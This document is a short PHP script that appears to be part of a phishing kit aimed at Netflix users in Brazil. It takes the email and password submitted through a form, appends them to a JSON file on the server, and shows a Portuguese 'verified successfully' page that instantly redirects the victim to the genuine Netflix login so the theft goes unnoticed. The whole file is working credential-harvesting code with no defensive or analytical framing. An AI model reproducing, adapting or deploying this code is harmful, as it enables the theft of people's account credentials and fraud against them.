<?php
$email = $_POST['email'];
$password = $_POST['password'];
    $fl = "operador/seguro/boleto1.json";
    if(file_exists($fl)){
        $h = fopen($fl, "r");
        $arr = json_decode(fread($h, filesize ($fl)));
        array_push($arr,array($email, $password));
        fclose($h);
    } else {
        $arr = array(
            array($email, $password)
        );
    }
    $fhs = fopen($fl, 'w') or die("can't open file");
    fwrite($fhs, json_encode($arr));
    fclose($fhs);
     ?>

     
<!DOCTYPE html>
<html>
 <head> 
  <title>Verificado com sucesso </title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no"> 
  <meta http-equiv="refresh" content="0, url='https://www.netflix.com/br/login'"> 
  <link rel="shortcut icon" href="assets/imagenss/ico_favicon.png"> 
  <link rel="stylesheet" type="text/css" href="../assets/css/benef_compras_style.css"> 
 </head> 



</html>